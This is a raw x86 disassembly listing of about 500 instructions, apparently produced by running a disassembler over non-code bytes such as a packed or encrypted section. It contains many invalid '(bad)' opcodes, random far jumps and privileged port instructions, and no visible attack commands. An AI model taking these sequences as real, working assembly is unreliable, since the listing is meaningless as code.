  41b28e:	fbld   TBYTE PTR [edx+0x757b72f4]
  41b294:	neg    ebx
  41b296:	ins    DWORD PTR es:[edi],dx
  41b297:	int3   
  41b298:	cmp    al,0x6e
  41b29a:	retf   0x94f0
  41b29d:	sub    eax,0x42b39edf
  41b2a2:	jg     0x41b2a5
  41b2a4:	ret    
  41b2a5:	add    ch,BYTE PTR [edx-0x216353f6]
  41b2ab:	mov    ds:0x45a13152,al
  41b2b0:	jp     0x41b2d1
  41b2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2b3:	cmpps  xmm7,XMMWORD PTR ds:0x8ee178b4,0xab
  41b2bb:	rol    DWORD PTR ds:0x898b6a98,1
  41b2c1:	and    al,0xa3
  41b2c3:	mov    ah,0x92
  41b2c5:	call   0xbe72:0x7d66c957
  41b2cc:	mov    eax,ds:0x20784495
  41b2d1:	inc    edx
  41b2d2:	dec    edi
  41b2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2d5:	mov    ecx,0x30fcd6a0
  41b2da:	xchg   edi,eax
  41b2db:	cwde   
  41b2dc:	call   0xfe19:0xd1bbfe61
  41b2e3:	sub    eax,0x7908021a
  41b2e8:	dec    esi
  41b2e9:	xchg   edi,eax
  41b2ea:	and    eax,0xfb3f299d
  41b2ef:	fadd   st,st(5)
  41b2f1:	inc    ebp
  41b2f2:	jge    0x41b31a
  41b2f4:	int3   
  41b2f5:	pop    eax
  41b2f6:	jne    0x41b278
  41b2f8:	adc    al,0x93
  41b2fa:	std    
  41b2fb:	push   0x79
  41b2fd:	pushf  
  41b2fe:	adc    DWORD PTR [edi+0x1f],0xb44ff25
  41b305:	mov    cl,0xf5
  41b307:	jmp    0x6411:0xd1f2f343
  41b30e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b30f:	mov    edx,0xb06fe6e3
  41b314:	aam    0x4a
  41b316:	mov    WORD PTR [ebp-0x42],ds
  41b319:	nop
  41b31a:	jno    0x41b347
  41b31c:	das    
  41b31d:	xor    edx,eax
  41b31f:	add    ah,dl
  41b321:	mov    al,ds:0x9008c17e
  41b326:	lods   eax,DWORD PTR ds:[esi]
  41b327:	mov    ch,0x1a
  41b329:	dec    edi
  41b32a:	pushf  
  41b32b:	xor    DWORD PTR [esi+eiz*1-0x7650d128],ebp
  41b332:	sub    eax,0x41a3845e
  41b337:	dec    ecx
  41b338:	adc    ah,0xe
  41b33b:	cli    
  41b33c:	js     0x41b2cd
  41b33e:	dec    esi
  41b33f:	cld    
  41b340:	je     0x41b3a0
  41b342:	sbb    ebp,DWORD PTR [eax-0x2b]
  41b345:	stos   BYTE PTR es:[edi],al
  41b346:	retf   
  41b347:	clc    
  41b348:	or     edx,DWORD PTR [esi-0x163a0a37]
  41b34e:	lods   al,BYTE PTR ds:[esi]
  41b34f:	jne    0x41b2f0
  41b351:	pop    ecx
  41b352:	xchg   di,ax
  41b354:	sbb    DWORD PTR [ebx],0xffffffb0
  41b357:	lods   al,BYTE PTR ds:[esi]
  41b358:	and    eax,0x7f51821e
  41b35d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b35e:	xchg   esp,eax
  41b35f:	xchg   edx,eax
  41b360:	cld    
  41b361:	loopne 0x41b353
  41b363:	dec    eax
  41b364:	dec    ebx
  41b365:	dec    edi
  41b366:	mov    edx,0x7fe7276e
  41b36b:	call   0x4c94:0x97be373
  41b372:	lods   al,BYTE PTR ds:[esi]
  41b373:	pop    edi
  41b374:	sub    eax,0xdb8843d7
  41b379:	jmp    0x41b3ee
  41b37b:	jg     0x41b309
  41b37d:	mov    ?,WORD PTR [edx+0x5d256a7d]
  41b383:	xor    dl,BYTE PTR [edi-0x75]
  41b386:	mov    ah,0xb8
  41b388:	xlat   BYTE PTR ds:[ebx]
  41b389:	sbb    cl,BYTE PTR [ebx+0x1110bf7b]
  41b38f:	je     0x41b3d4
  41b391:	add    ecx,DWORD PTR [edx]
  41b393:	loopne 0x41b3ba
  41b395:	nop
  41b396:	add    al,BYTE PTR [edi+ecx*1]
  41b399:	mov    ecx,0x6cca4d44
  41b39e:	ins    BYTE PTR es:[edi],dx
  41b39f:	push   0xffffff88
  41b3a1:	enter  0xbb26,0x1c
  41b3a5:	sbb    DWORD PTR [esi],edx
  41b3a7:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41b3a9:	sbb    eax,0xa0522f61
  41b3ae:	adc    al,0x97
  41b3b0:	lock xchg ebp,eax
  41b3b2:	stos   DWORD PTR es:[edi],eax
  41b3b3:	icebp  
  41b3b4:	out    dx,al
  41b3b5:	and    DWORD PTR [esp+eiz*8-0xf],eax
  41b3b9:	sub    eax,0x6a645220
  41b3be:	and    eax,0x73bf22ec
  41b3c3:	push   0xffffffcb
  41b3c5:	dec    ebp
  41b3c6:	push   0xffffff8e
  41b3c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ca:	and    dl,BYTE PTR [edi-0x41dfd77d]
  41b3d0:	mov    ch,BYTE PTR [esi+edi*8-0x10]
  41b3d4:	adc    eax,0x5f245050
  41b3d9:	cmp    BYTE PTR [edx+0x73],0xdf
  41b3dd:	jmp    0x9361:0x6699b6dd
  41b3e4:	mov    ds:0x39f226b0,eax
  41b3e9:	cmp    ch,bl
  41b3eb:	add    BYTE PTR [ebp+0x22],ch
  41b3ee:	shl    DWORD PTR [edi+ebp*2-0x71],0xbe
  41b3f3:	test   DWORD PTR [eax+0x67],esp
  41b3f6:	sbb    bh,BYTE PTR [esi+eax*2]
  41b3f9:	sbb    ch,BYTE PTR [edx]
  41b3fb:	into   
  41b3fc:	cwde   
  41b3fd:	ins    DWORD PTR es:[edi],dx
  41b3fe:	jo     0x41b464
  41b400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b401:	aam    0x21
  41b403:	xchg   ebx,eax
  41b404:	cwde   
  41b405:	cdq    
  41b406:	sub    bh,dl
  41b408:	call   0x43d010ad
  41b40d:	pop    ecx
  41b40e:	dec    eax
  41b40f:	aaa    
  41b410:	hlt    
  41b411:	fwait
  41b412:	sbb    DWORD PTR [edx-0x50],0x63a8ba0
  41b419:	and    eax,0x72d50855
  41b41e:	mov    esi,0x81025769
  41b423:	and    ch,dl
  41b425:	adc    ebp,DWORD PTR [ebx]
  41b427:	add    eax,0xe69f764f
  41b42c:	fild   WORD PTR [ebp+0x3a]
  41b42f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b430:	or     edi,ecx
  41b432:	push   edx
  41b433:	sbb    dx,WORD PTR [eax-0x2ce1c852]
  41b43a:	xchg   edx,eax
  41b43b:	jbe    0x41b45e
  41b43d:	ficom  DWORD PTR [esi]
  41b43f:	addr16 aam 0xaf
  41b442:	or     DWORD PTR [ecx-0x4],ecx
  41b445:	rcr    eax,0x88
  41b448:	add    edx,DWORD PTR [ebx+0x1873be50]
  41b44e:	add    al,0x93
  41b450:	jecxz  0x41b48d
  41b452:	xchg   edx,eax
  41b453:	push   ebp
  41b454:	push   eax
  41b455:	push   0xf489bca8
  41b45a:	ret    0x2e66
  41b45d:	and    DWORD PTR [esi-0x866f7ee],ecx
  41b463:	out    dx,al
  41b464:	mov    ecx,0xfa2ace86
  41b469:	push   eax
  41b46a:	sub    BYTE PTR [ecx],0xcd
  41b46d:	aad    0xc8
  41b46f:	fbstp  TBYTE PTR ss:[ebp+0x14]
  41b473:	adc    BYTE PTR [edx],0xce
  41b476:	push   eax
  41b477:	xlat   BYTE PTR ds:[ebx]
  41b478:	xchg   edi,eax
  41b479:	repz fsub QWORD PTR [edi-0x80]
  41b47d:	lds    ebp,FWORD PTR gs:0x179f59c9
  41b484:	mov    al,ds:0xff6df097
  41b489:	add    DWORD PTR [ebp-0x58],0xfffffffe
  41b48d:	fist   DWORD PTR [ecx+0x55]
  41b490:	sti    
  41b491:	adc    eax,DWORD PTR [edx+0x3866e32f]
  41b497:	sub    edx,DWORD PTR [eax+0xa]
  41b49a:	out    0x5,eax
  41b49c:	push   ebp
  41b49d:	xchg   edx,eax
  41b49e:	imul   ebx,DWORD PTR [ebx-0xd143d2b],0xf30824ef
  41b4a8:	sub    ah,0xa3
  41b4ab:	mov    DWORD PTR [edi],esp
  41b4ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4ae:	and    DWORD PTR [esi],edx
  41b4b0:	mov    al,ds:0xdda37d17
  41b4b5:	arpl   WORD PTR [edx-0x4e],cx
  41b4b8:	shl    DWORD PTR [eax],0x2
  41b4bb:	sub    ecx,DWORD PTR [eax]
  41b4bd:	push   0x585dcff
  41b4c2:	sbb    eax,0xa0feedd5
  41b4c7:	stc    
  41b4c8:	(bad)  
  41b4c9:	repnz int 0x85
  41b4cc:	fs das 
  41b4ce:	xchg   BYTE PTR [edx],al
  41b4d0:	lock retf 
  41b4d2:	mov    WORD PTR [eax],ss
  41b4d4:	stos   BYTE PTR es:[edi],al
  41b4d5:	mov    dh,bl
  41b4d7:	(bad)  [edi+ebp*8+0x6dafc60d]
  41b4de:	add    al,0x78
  41b4e0:	out    0xca,al
  41b4e2:	pop    ebp
  41b4e3:	xlat   BYTE PTR ds:[ebx]
  41b4e4:	jno    0x41b542
  41b4e6:	inc    esi
  41b4e7:	mov    bl,0xcd
  41b4e9:	jle    0x41b53c
  41b4eb:	cmp    eax,DWORD PTR [eax-0x33]
  41b4ee:	jne    0x41b4fb
  41b4f0:	(bad)  
  41b4f1:	pop    edx
  41b4f2:	andps  xmm1,xmm4
  41b4f5:	stos   BYTE PTR es:[edi],al
  41b4f6:	aam    0x51
  41b4f8:	pop    ecx
  41b4f9:	mov    ah,0xbd
  41b4fb:	pop    ebx
  41b4fc:	int    0x9c
  41b4fe:	popf   
  41b4ff:	and    edi,esi
  41b501:	lock stc 
  41b503:	push   0xfffffff2
  41b505:	pop    edx
  41b506:	cmp    eax,0x6053697c
  41b50b:	ss adc bh,bl
  41b50e:	hlt    
  41b50f:	and    al,0x66
  41b511:	cmp    dl,BYTE PTR [ecx-0x38]
  41b514:	jmp    0x66e4799d
  41b519:	es nop
  41b51b:	mov    eax,esp
  41b51d:	lahf   
  41b51e:	add    eax,DWORD PTR [ecx+ecx*8-0x1bb1907e]
  41b525:	inc    esp
  41b526:	xchg   ebp,eax
  41b527:	and    ch,BYTE PTR [ebp+0x46]
  41b52a:	fbld   TBYTE PTR [ebx-0x9]
  41b52d:	or     ebx,eax
  41b52f:	icebp  
  41b530:	pop    edi
  41b531:	mov    esi,0x62477981
  41b536:	shr    BYTE PTR [esi],cl
  41b538:	pop    esi
  41b539:	lea    edx,[ecx+ebp*1]
  41b53c:	and    eax,esi
  41b53e:	mov    ecx,0x96058586
  41b543:	cs fwait
  41b545:	or     ebx,0x17c0f115
  41b54b:	mov    bl,0x9d
  41b54d:	bound  esi,QWORD PTR [ecx+0x34a7e262]
  41b553:	imul   ebx,DWORD PTR [ecx+0x497506a4],0x66d10986
  41b55d:	push   0xf8d0133d
  41b562:	pop    ebp
  41b563:	mov    WORD PTR [eax-0x1ea2484c],ds
  41b569:	pop    ebp
  41b56a:	and    BYTE PTR [eax-0x80],dh
  41b56d:	ficomp DWORD PTR [ecx+0x7a2841d8]
  41b573:	dec    esi
  41b574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b575:	push   eax
  41b576:	(bad)  
  41b577:	pop    ecx
  41b578:	nop
  41b579:	or     al,0x74
  41b57b:	stos   DWORD PTR es:[edi],eax
  41b57c:	out    dx,al
  41b57d:	mov    esp,0x40f7853e
  41b582:	cmp    DWORD PTR [ecx+ebp*1+0x46],ebp
  41b586:	inc    edx
  41b587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b588:	in     al,dx
  41b589:	xchg   ebp,eax
  41b58a:	std    
  41b58b:	mov    eax,ds:0xe0d106d4
  41b590:	nop
  41b591:	fiadd  DWORD PTR [edx+0x3f]
  41b594:	mov    ah,BYTE PTR ds:0xe18f50d8
  41b59a:	cmp    bl,BYTE PTR [edx]
  41b59c:	aaa    
  41b59d:	sar    DWORD PTR [esi-0x3a151d5f],cl
  41b5a3:	(bad)  
  41b5a4:	mov    ecx,0xfb3cb536
  41b5a9:	jecxz  0x41b584
  41b5ab:	sbb    DWORD PTR [ecx-0x3d545cfe],ecx
  41b5b1:	ds xor dl,dh
  41b5b4:	dec    ebp
  41b5b5:	hlt    
  41b5b6:	lock stc 
  41b5b8:	lea    ebp,[ebx]
  41b5ba:	fimul  WORD PTR [ebp+0x43c9064e]
  41b5c0:	stos   BYTE PTR es:[edi],al
  41b5c1:	cmp    esi,edx
  41b5c3:	in     eax,0x25
  41b5c5:	hlt    
  41b5c6:	cmc    
  41b5c7:	leave  
  41b5c8:	imul   ebp,DWORD PTR [esi+0x53],0x93305f07
  41b5cf:	in     eax,dx
  41b5d0:	outs   dx,BYTE PTR ds:[esi]
  41b5d1:	jle    0x41b639
  41b5d3:	cmp    DWORD PTR [ecx-0x6e],eax
  41b5d6:	fiadd  WORD PTR [ecx+0x5]
  41b5d9:	in     eax,0x77
  41b5db:	jbe    0x41b5f9
  41b5dd:	add    dh,ch
  41b5df:	mov    ch,0x78
  41b5e1:	push   cs
  41b5e2:	adc    dl,BYTE PTR [edi]
  41b5e4:	dec    ebx
  41b5e5:	fidivr DWORD PTR [ebx-0x6c]
  41b5e8:	addr16 aad 0x2c
  41b5eb:	ret    
  41b5ec:	imul   ecx
  41b5ee:	add    eax,0x3070e1bb
  41b5f3:	arpl   cx,bx
  41b5f5:	jecxz  0x41b61b
  41b5f7:	sub    DWORD PTR [esi-0x7e],ecx
  41b5fa:	cmc    
  41b5fb:	dec    ebx
  41b5fc:	and    cl,bl
  41b5fe:	test   bl,ch
  41b600:	cmp    DWORD PTR [ecx-0x1dc2542c],eax
  41b606:	add    al,0xa5
  41b608:	into   
  41b609:	adc    BYTE PTR [esi],dl
  41b60b:	aaa    
  41b60c:	or     dh,BYTE PTR [ecx]
  41b60e:	lds    ebp,FWORD PTR [ebx+0x4]
  41b611:	addr16 test al,0x84
  41b614:	inc    esp
  41b615:	rcr    DWORD PTR [ebx-0x21],1
  41b618:	mov    dh,0x8c
  41b61a:	cmp    eax,0x91875910
  41b61f:	lahf   
  41b620:	pop    esi
  41b621:	repnz outs dx,DWORD PTR ds:[esi]
  41b623:	les    edx,FWORD PTR [ebp-0x565d6e13]
  41b629:	xor    al,dl
  41b62b:	add    al,BYTE PTR [edi+0x4e067e3d]
  41b631:	das    
  41b632:	pusha  
  41b633:	int    0xfa
  41b635:	mov    ecx,0x99e79f1f
  41b63a:	sbb    ebp,esi
  41b63c:	pop    ds
  41b63d:	aaa    
  41b63e:	mov    dl,0x0
  41b640:	(bad)  
  41b641:	retf   
  41b642:	fxch   st(5)
  41b644:	inc    esp
  41b645:	and    dh,BYTE PTR [edi-0x5de91a86]
  41b64b:	cmp    DWORD PTR [edi+0x13],ebp
  41b64e:	or     ebx,DWORD PTR [esi-0x5e44b0f]
  41b654:	sbb    eax,ebp
  41b656:	inc    esi
  41b657:	xchg   edi,eax
  41b658:	pop    ds
  41b659:	lods   eax,DWORD PTR ds:[esi]
  41b65a:	int    0x94
  41b65c:	int    0x68
  41b65e:	adc    al,0xb5
  41b660:	ud1    esp,esp
  41b663:	adc    DWORD PTR [edi],0x55
  41b666:	aam    0x57
  41b668:	or     al,0xfa
  41b66a:	sub    cl,0xfb
  41b66d:	js     0x41b62f
  41b66f:	jle    0x41b612
  41b671:	xchg   esi,eax
  41b672:	test   eax,0xc9341284
  41b677:	imul   eax,DWORD PTR [ecx+0x6a],0x3004d80c
  41b67e:	jbe    0x41b6df
  41b680:	ror    DWORD PTR [ecx],0x60
  41b683:	test   bh,ah
  41b685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b686:	stos   DWORD PTR es:[edi],eax
  41b687:	fdiv   DWORD PTR [ecx]
  41b689:	dec    ebp
  41b68a:	mov    edi,0x10a25b36
  41b68f:	daa    
  41b690:	adc    bl,ch
  41b692:	repnz or BYTE PTR [edi+0x1c],dh
  41b696:	std    
  41b697:	jl     0x41b698
  41b699:	out    dx,eax
  41b69a:	repz lahf 
  41b69c:	int3   
  41b69d:	and    al,0x19
  41b69f:	fcmovbe st,st(2)
  41b6a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6a2:	daa    
  41b6a3:	jmp    0x4fe7:0x8a8152db
  41b6aa:	xor    eax,0x9d6d30fd
  41b6af:	(bad)  
  41b6b0:	cdq    
  41b6b1:	inc    ebp
  41b6b2:	adc    al,0x2e
  41b6b4:	neg    BYTE PTR [ecx-0x49f693c3]
  41b6ba:	ins    BYTE PTR es:[edi],dx
  41b6bb:	ss mov ah,0x79
  41b6be:	mov    al,ds:0x6df240aa
  41b6c3:	adc    dh,BYTE PTR cs:[eax+esi*2+0x26]
  41b6c8:	call   0xc0028488
  41b6cd:	sub    dl,BYTE PTR [ebp-0x1f8c6b07]
  41b6d3:	and    ah,BYTE PTR [bp-0x3a]
  41b6d7:	mov    gs,WORD PTR [esi+0x6f]
  41b6da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6db:	out    dx,al
  41b6dc:	mov    ebp,0x6e324f3d
  41b6e1:	add    al,BYTE PTR [ebx+0x1e]
  41b6e4:	xor    DWORD PTR [edx],eax
  41b6e6:	test   BYTE PTR ds:0xa596adaa,ah
  41b6ec:	jbe    0x41b6d2
  41b6ee:	jmp    0x7d2a1dd3
  41b6f3:	mov    cl,0x3b
  41b6f5:	push   ss
  41b6f6:	mov    ch,0x6c
  41b6f8:	push   ebx
  41b6f9:	outs   dx,DWORD PTR ds:[esi]
  41b6fa:	stc    
  41b6fb:	push   0x3c77f354
  41b700:	and    bh,ch
  41b702:	adc    dh,BYTE PTR [esp]
  41b705:	fcomp  DWORD PTR [ebp-0x79540ed7]
  41b70b:	mov    bh,BYTE PTR [esi+0x102d5edd]
  41b711:	fmul   QWORD PTR [eax+0x37092e47]
  41b717:	lods   al,BYTE PTR ds:[esi]
  41b718:	xchg   ebp,eax
  41b719:	out    dx,al
  41b71a:	int3   
  41b71b:	sti    
  41b71c:	(bad)  
  41b71d:	cmp    bl,dh
  41b71f:	dec    ecx
  41b720:	in     al,0x24
  41b722:	xchg   ecx,eax
  41b723:	jnp    0x41b746
  41b725:	in     eax,dx
  41b726:	setle  BYTE PTR [ebp+0x3d6d4e76]
  41b72d:	mov    bl,bl
  41b72f:	push   0x38f0e0cc
  41b734:	in     eax,dx
  41b735:	fwait
  41b736:	retf   0x7c17
  41b739:	leave  
  41b73a:	mov    ebp,0xf0237e62
  41b73f:	adc    DWORD PTR [esi-0x364ac828],esp
  41b745:	int    0xe
  41b747:	lods   al,BYTE PTR ds:[esi]
  41b748:	test   eax,0xe7e701df
  41b74d:	push   ebp
  41b74e:	pop    ds
  41b74f:	sub    DWORD PTR [ecx+0x61],esp
  41b752:	sbb    al,0x78
  41b754:	push   cs
  41b755:	push   eax
  41b756:	adc    BYTE PTR [esi+0x73],0xe4
  41b75a:	mov    esi,0x8e683f82
  41b75f:	lds    edi,FWORD PTR [ebx]
  41b761:	sar    eax,cl
  41b763:	jmp    0xa748:0xd5771aee
  41b76a:	inc    ecx
  41b76b:	lahf   
  41b76c:	sub    eax,0xcf94247e
  41b771:	sbb    al,0x2c
  41b773:	pop    ebx
  41b774:	cmp    eax,0xcf492e7c
  41b779:	push   edi
  41b77a:	loope  0x41b7ec
  41b77c:	push   ds
  41b77d:	ret    
  41b77e:	mov    bh,0xf0
  41b780:	xor    DWORD PTR [edx],edi
  41b782:	jge    0x41b7c8
  41b784:	aam    0xcf
  41b786:	mov    esi,0x8f72f7bb
  41b78b:	xchg   esp,eax
  41b78c:	and    al,0x2
  41b78e:	imul   edi,DWORD PTR [ebx],0x20
  41b791:	xchg   ebx,eax
  41b792:	pop    ss
  41b793:	and    esi,DWORD PTR [ebp-0x79]
  41b796:	js     0x41b7e8
  41b798:	jg     0x41b7bf
  41b79a:	pop    ds
  41b79b:	leave  
  41b79c:	dec    ecx
  41b79d:	and    al,0x1a
  41b79f:	and    al,0xd8
  41b7a2:	xchg   DWORD PTR [ecx+ebp*4-0x48b28d3d],ebp
  41b7a9:	cmp    BYTE PTR [ebx],ch
  41b7ab:	and    esi,ecx
  41b7ad:	cmp    esp,DWORD PTR [edx-0x4b]
  41b7b0:	das    
  41b7b1:	in     eax,0x1c
  41b7b3:	push   esp
  41b7b4:	sbb    DWORD PTR [edi+ebp*8],0x39
  41b7b8:	inc    ecx
  41b7b9:	pop    eax
  41b7ba:	jbe    0x41b741
  41b7bc:	lea    ebp,[ecx+ebp*4+0x5d]
  41b7c0:	mov    BYTE PTR [edi],bl
  41b7c2:	mov    bl,0x19
  41b7c4:	mov    ebx,0xe747471
  41b7c9:	and    eax,0xd8cff2de
  41b7ce:	pop    edx
  41b7cf:	and    edi,DWORD PTR [ebp+0x4b]
  41b7d2:	fild   QWORD PTR [edi-0x67]
  41b7d5:	sub    eax,0x83974c61
  41b7da:	pop    ds
  41b7db:	push   0xffffff99
  41b7dd:	mov    ds:0xc87d989,eax
  41b7e2:	aaa    
  41b7e3:	cwde   
  41b7e4:	scas   al,BYTE PTR es:[edi]
  41b7e5:	cdq    
  41b7e6:	sar    BYTE PTR [ebp-0xcf2acd5],cl
  41b7ec:	push   esi
  41b7ed:	and    bl,BYTE PTR [eax+ebp*4+0x49debaf8]
  41b7f4:	push   esp
  41b7f5:	dec    esi
  41b7f6:	loope  0x41b818
  41b7f8:	inc    edi
  41b7f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7fa:	test   eax,0x6952112c
  41b7ff:	(bad)  
  41b800:	jns    0x41b87c
  41b802:	bnd es jns 0x41b885
  41b806:	cmp    BYTE PTR [ebx+ebx*8-0x6c],dl
  41b80a:	mov    ebp,0x6396ab5c
  41b80f:	ds daa 
  41b811:	mov    eax,0x10c86216
  41b816:	jecxz  0x41b7a2
  41b818:	sbb    BYTE PTR [edx+esi*1-0x348dd010],cl
  41b81f:	mov    BYTE PTR [ebp-0x7bee0f7b],0x77
  41b826:	push   eax
  41b827:	mov    eax,0xa29aac7
  41b82c:	pop    esp
  41b82d:	xchg   edx,eax
  41b82e:	rol    DWORD PTR [edx+0x26],cl
  41b831:	ds push esp
  41b833:	add    BYTE PTR [eax+eax*8+0x4f],al
  41b837:	and    edx,DWORD PTR [esi+0x4380bb43]
  41b83d:	mov    ch,0x96
  41b83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b840:	push   ecx
  41b841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b842:	mov    BYTE PTR [ecx+0x4],0x9b
  41b846:	add    ah,cl
  41b848:	rcr    BYTE PTR [eax+0x26],0x83
  41b84c:	inc    edx
  41b84d:	les    eax,FWORD PTR ss:[ebp+0xd]
  41b851:	cdq    
  41b852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b853:	leave  
  41b854:	mov    ds:0x4d1e02b4,eax
  41b859:	aad    0x26
  41b85b:	retf   
  41b85c:	stos   DWORD PTR es:[edi],eax
  41b85d:	mov    edi,ebp
  41b85f:	push   ecx
  41b860:	push   ecx
  41b861:	jp     0x41b8a9
  41b863:	pop    eax
  41b864:	aas    
  41b865:	inc    edx
  41b866:	loopne 0x41b8ab
  41b868:	iret   
  41b869:	ror    BYTE PTR [ebx-0x77],cl
  41b86c:	cli    
  41b86d:	int    0xec
  41b86f:	sbb    eax,0xebf54afb
  41b874:	mov    bh,0xc0
  41b876:	mov    cl,0xfb
  41b878:	vpmacsww xmm15,xmm5,XMMWORD PTR [edx-0x32],xmm6
  41b87f:	pop    ebp
  41b880:	sbb    BYTE PTR [esi+0x8fb386a],dl
  41b886:	nop
  41b887:	dec    ecx
  41b888:	or     al,0x77
  41b88a:	mov    ebx,ecx
  41b88c:	push   edi
  41b88d:	cwde   
  41b88e:	push   esi
  41b88f:	push   cs
  41b890:	pop    ds
  41b891:	repz jae 0x1bb080bf
  41b898:	test   eax,0x28829431
  41b89d:	cmp    esp,DWORD PTR ds:0xc944cb02
  41b8a3:	sub    eax,0x93f5419d
  41b8a8:	aas    
  41b8a9:	call   FWORD PTR fs:[ecx-0x21]
  41b8ad:	cmp    eax,0xe608b9b4
  41b8b2:	js     0x41b8d2
  41b8b4:	xor    al,0xc2
  41b8b6:	or     DWORD PTR [edi-0x7923cb0e],esp
  41b8bc:	mov    eax,ds:0x20192c54
  41b8c1:	out    0xfb,eax
  41b8c3:	aas    
  41b8c4:	jo     0x41b856
  41b8c6:	icebp  
  41b8c7:	pop    ds
  41b8c8:	mov    esp,0x906a0d4e
  41b8cd:	lods   eax,DWORD PTR ds:[esi]
  41b8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8cf:	std    
  41b8d0:	pop    edi
  41b8d1:	arpl   WORD PTR [edx+esi*4-0x24],dx
  41b8d5:	mov    bl,0xee
  41b8d7:	dec    ebp
  41b8d8:	dec    ebp
  41b8d9:	jnp    0x41b8f6
  41b8db:	mov    esi,ebx
  41b8dd:	xchg   ebp,eax
  41b8de:	jmp    0x41b910
  41b8e0:	pusha  
  41b8e1:	jno    0x41b94f
  41b8e3:	add    edi,DWORD PTR [eax-0x6aa075f2]
  41b8e9:	or     BYTE PTR [eax-0x1f],0x4d
  41b8ed:	das    
  41b8ee:	jo     0x41b88d
  41b8f0:	mov    dl,0x7f
  41b8f2:	ret    0x8f0b
  41b8f5:	push   esi
  41b8f6:	js     0x41b938
  41b8f8:	inc    eax
  41b8f9:	inc    edi
  41b8fa:	shl    DWORD PTR [eax-0x6b],0xf2
  41b8fe:	daa    
  41b8ff:	add    al,0x2c
  41b901:	test   al,0x21
  41b903:	es stos BYTE PTR es:[edi],al
  41b905:	jbe    0x41b985
  41b907:	adc    eax,0x5d057527
  41b90c:	push   esp
  41b90d:	xor    BYTE PTR [ecx],cl
  41b90f:	push   cs
  41b910:	pop    ecx
  41b911:	fwait
  41b912:	lds    edi,FWORD PTR [ebx-0xa434895]
  41b918:	dec    edx
  41b919:	ins    DWORD PTR es:[edi],dx
  41b91a:	jne    0x41b917
  41b91c:	jl     0x41b8b1
  41b91e:	or     ch,BYTE PTR [eax-0x1465a1ab]
  41b924:	mov    ebx,0xde9ad014
  41b929:	call   0x91f:0xc89aa443
  41b930:	pop    esi
  41b931:	add    ecx,ebx
  41b933:	inc    ebp
  41b934:	into   
  41b935:	retf   
  41b936:	add    BYTE PTR [ecx+0x30],0x40
  41b93a:	jl     0x41b978
  41b93c:	repz mov ecx,0xf9150d6
  41b942:	push   edi
  41b943:	mov    ds:0xefdf01ac,al
  41b948:	sub    eax,DWORD PTR [edx+eiz*2+0x5e2143fc]
  41b94f:	lock adc ebx,edx
  41b952:	jnp    0x41b8e8
  41b954:	xchg   BYTE PTR [ebx+0x7cacceb3],ch
  41b95a:	push   ss
  41b95b:	jns    0x41b99e
  41b95d:	pop    edi
  41b95e:	icebp  
  41b95f:	aas    
  41b960:	ror    DWORD PTR [ecx],cl
  41b962:	scas   eax,DWORD PTR es:[edi]
  41b963:	jo     0x41b90a
  41b965:	loope  0x41b995
  41b967:	xchg   BYTE PTR [ecx-0x18],al
  41b96a:	xor    edx,ebp
  41b96c:	mov    ch,0x22
  41b96e:	mov    edi,0x95e94ed0
  41b973:	in     eax,0x5a
  41b975:	jmp    0x7306:0x9d2923cf
  41b97c:	(bad)  
  41b97d:	neg    BYTE PTR [eax+ecx*1-0x23]
  41b981:	fadd   st(6),st
  41b983:	aas    
  41b984:	stos   BYTE PTR es:[edi],al
  41b985:	dec    DWORD PTR [ebx]
  41b987:	push   esp
  41b988:	pop    ebp
  41b989:	sbb    ebp,DWORD PTR [esi]
  41b98b:	test   DWORD PTR [edi-0x32],ebp
  41b98e:	xor    al,0xb0
  41b990:	into   
  41b991:	imul   ebp,esp,0xcf6b2ff0
  41b997:	imul   esp,DWORD PTR [ecx],0x9e5898ea
  41b99d:	xchg   ebx,eax
  41b99e:	adc    BYTE PTR [ecx+0x1d],0x8d
  41b9a2:	xor    eax,0xafe6296a
  41b9a7:	xchg   edi,eax
  41b9a8:	cmp    edi,DWORD PTR [ebx-0x4a]
  41b9ab:	jmp    0xf65b:0xb259847d
  41b9b2:	mov    dl,0xcd
  41b9b4:	or     BYTE PTR [esi],ch
  41b9b6:	mov    ecx,DWORD PTR [eax-0x7216052]
  41b9bc:	lea    eax,[edi+0x19]
  41b9bf:	iret   
  41b9c0:	cld    
  41b9c1:	rol    esp,cl
  41b9c3:	jae    0x41b994
  41b9c5:	push   edi
  41b9c6:	in     eax,dx
  41b9c7:	nop
  41b9c8:	jge    0x41b968
  41b9ca:	xchg   ecx,eax
  41b9cb:	push   ecx
  41b9cc:	mov    al,0x72
  41b9ce:	cwde   
  41b9cf:	(bad)  
  41b9d0:	cmp    al,BYTE PTR [eax]
  41b9d2:	xor    dh,bh
  41b9d4:	rol    BYTE PTR [ebx],cl
  41b9d6:	in     al,0xf5
  41b9d8:	enter  0x79bf,0x3e
  41b9dc:	pop    ds
  41b9dd:	jge    0x41ba18
  41b9df:	dec    ebp
  41b9e0:	into   
  41b9e1:	mov    ds:0x561b9654,al
  41b9e6:	sbb    eax,0x261da12c
  41b9eb:	push   ecx
  41b9ec:	dec    edx
  41b9ed:	cwde   
  41b9ee:	jo     0x41b9f1
  41b9f0:	rol    BYTE PTR [edx+0x16588d6c],0x16
  41b9f7:	sub    eax,0x607a9667
  41b9fc:	fist   DWORD PTR [edx]
